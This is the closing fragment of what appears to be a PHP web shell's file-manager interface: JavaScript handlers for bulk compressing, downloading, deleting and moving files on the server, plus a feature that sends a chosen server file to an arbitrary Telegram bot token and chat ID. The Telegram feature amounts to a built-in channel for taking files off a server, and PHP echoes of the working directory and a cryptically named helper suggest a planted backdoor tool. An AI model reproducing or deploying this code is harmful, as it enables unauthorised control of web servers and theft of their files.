                    input.type = 'hidden'; input.name = 'files[]'; input.value = fileName;
                    form.appendChild(input);
                });
                for(const key in extraData) {
                    const input = document.createElement('input');
                    input.type = 'hidden'; input.name = key; input.value = extraData[key];
                    form.appendChild(input);
                }
                document.body.appendChild(form);
                form.submit();
            }

            document.getElementById('compress-selected-btn').addEventListener('click', () => createAndSubmitForm('compress_selected'));
            document.getElementById('download-selected-btn').addEventListener('click', () => createAndSubmitForm('compress_selected'));
            document.getElementById('delete-selected-btn').addEventListener('click', () => { if(confirm('Are you sure you want to delete selected items?')) createAndSubmitForm('delete_selected'); });
            document.getElementById('move-selected-btn').addEventListener('click', () => { 
                const dest = prompt("Enter destination directory path:", "<?php echo g1($_d); ?>");
                if (dest) createAndSubmitForm('move_selected', { destination: dest });
            });
        }

        let fileToDownload = '';
        const downloadModal = document.getElementById('downloadModal');
        function openDownloadModal(filename) { fileToDownload = filename; document.getElementById('downloadFileName').textContent = decodeURIComponent(filename); downloadModal.style.display = 'flex'; }
        function closeDownloadModal() { downloadModal.style.display = 'none'; }

        if(document.getElementById("sendTelegramBtn")){
            document.getElementById("sendTelegramBtn").addEventListener("click", function() {
                const token = document.getElementById("telegramToken").value;
                const chatId = document.getElementById("telegramChatId").value;
                if (!token || !chatId) { alert("Token and Chat ID are required."); return; }
                const currentDir = new URLSearchParams(window.location.search).get('dir') || '<?php echo getcwd(); ?>';
                const url = `?telegram_download=1&file=${encodeURIComponent(fileToDownload)}&token=${encodeURIComponent(token)}&chat_id=${encodeURIComponent(chatId)}&dir=${encodeURIComponent(currentDir)}`;
                fetch(url).then(res => res.json()).then(data => {
                    if (data.ok) alert("File sent!"); else alert("Failed to send file.");
                    closeDownloadModal();
                }).catch(() => { alert("An error occurred."); closeDownloadModal(); });
            });
        }
        
        if(document.getElementById("downloadFileBtn")){
            document.getElementById("downloadFileBtn").addEventListener("click", function() {
                const currentDir = new URLSearchParams(window.location.search).get('dir') || '<?php echo getcwd(); ?>';
                window.location.href = `?download=1&file=${encodeURIComponent(fileToDownload)}&dir=${encodeURIComponent(currentDir)}`;
                closeDownloadModal();
            });
        }
    </script>
</body>
</html>
